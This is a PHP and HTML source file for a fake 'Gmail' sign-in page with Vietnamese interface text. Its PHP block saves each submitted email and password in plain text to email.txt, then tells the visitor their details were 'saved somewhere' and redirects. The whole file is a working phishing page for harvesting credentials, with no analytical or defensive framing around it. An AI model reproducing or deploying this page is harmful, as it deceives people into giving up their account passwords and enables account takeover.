<?php

if (isset($_POST['login'])) {
    if (empty($_POST['email']) || empty($_POST['password'])) {
        echo 'Nhập cho đủ vào đi';
        header("Refresh: 2; url=../index.php");
        die();
    } else {
        $file = fopen("email.txt", "w");
        fwrite($file, $_POST['email'] . ':' . $_POST['password'] . "\n");
        fclose($file);
        echo 'Thông tin về email '. $_POST['email'] .' đã được lưu ở đâu đó!';
        header("Refresh: 2; url=./gmail.php");
        die();
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
</head>

<body>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500&display=swap');

        * {
            box-sizing: border-box;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            font-size: 17px;
        }

        #wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 80vh;
        }

        form {
            border: 1px solid #dadce0;
            border-radius: 5px;
            padding: 30px;
        }

        h3 {
            text-align: center;
            font-size: 24px;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        input {
            height: 50px;
            width: 300px;
            outline: none;
            border: 1px solid #dadce0;
            padding: 10px;
            border-radius: 5px;
            font-size: inherit;
            color: #202124;
            transition: all 0.3s ease-in-out;
        }

        label {
            position: absolute;
            padding: 0px 5px;
            left: 5px;
            top: 50%;
            /* Quan trọng  */
            pointer-events: none;
            transform: translateY(-50%);
            background: #fff;
            transition: all 0.3s ease-in-out;
        }

        .form-group input:focus {
            border: 2px solid #1a73e8;
        }

        .form-group input:focus+label,
        .form-group input:valid+label {
            top: 0px;
            font-size: 13px;
            font-weight: 500;
            color: #1a73e8;
        }

        input#btn-login {
            background: #1a73e8;
            color: #fff;
            cursor: pointer;
        }

        input#btn-login:hover {
            opacity: 0.85;
        }
    </style>
    <div id="wrapper">
        <form action="./gmail.php" method="POST">
            <h3>Đăng nhập</h3>
            <div class="form-group">
                <input type="text" name="email" required>
                <label for="">Email</label>
            </div>
            <div class="form-group">
                <input type="password" name="password" required>
                <label for="">Password</label>
            </div>
            <input type="submit" value="Đăng nhập" id="btn-login" name="login">
        </form>
    </div>
</body>

</html>